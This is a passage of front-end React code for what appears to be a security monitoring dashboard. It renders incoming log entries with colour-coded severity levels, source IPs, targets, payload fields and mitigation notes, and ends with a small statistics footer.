                          ? 'bg-emerald-950/20 border-emerald-500/30 text-emerald-300'
                          : log.level === 'CRITICAL'
                          ? 'bg-rose-950/30 border-rose-500/40 text-rose-300'
                          : log.level === 'WARN'
                          ? 'bg-amber-950/20 border-amber-500/30 text-amber-300'
                          : 'bg-slate-900/50 border-slate-800 text-slate-300'
                      }`}
                    >
                      <div className="flex items-center justify-between text-[10px]">
                        <span className="text-slate-400">[{log.timestamp}]</span>
                        <span className={`font-bold px-1.5 py-0.2 rounded text-[9px] ${
                          log.level === 'BLOCKED' ? 'bg-emerald-900/60 text-emerald-300' :
                          log.level === 'CRITICAL' ? 'bg-rose-900/60 text-rose-200' : 'bg-slate-800 text-slate-300'
                        }`}>
                          {log.level}
                        </span>
                      </div>
                      <div className="mt-1 font-semibold text-white truncate">
                        SRC: <span className="text-cyan-300">{log.sourceIp}</span> → {log.target}
                      </div>
                      <div className="text-[10px] text-slate-300 truncate">Payload: {log.payload}</div>
                      <div className="text-[10px] text-emerald-400 mt-0.5">Mitigation: {log.mitigation}</div>
                    </div>
                  ))
                )}
              </div>

              {/* Log Stats Footer */}
              <div className="pt-3 mt-auto border-t border-slate-800/80 flex items-center justify-between text-[10px] font-mono text-slate-400">
                <span>Kernel Probe: <strong>eBPF_HOOK_V4</strong></span>
                <span>Active Log Buffer: <strong>{logs.length} events</strong></span>
              </div>

            </div>
          </div>

        </div>

      </div>
    </section>
  );
};
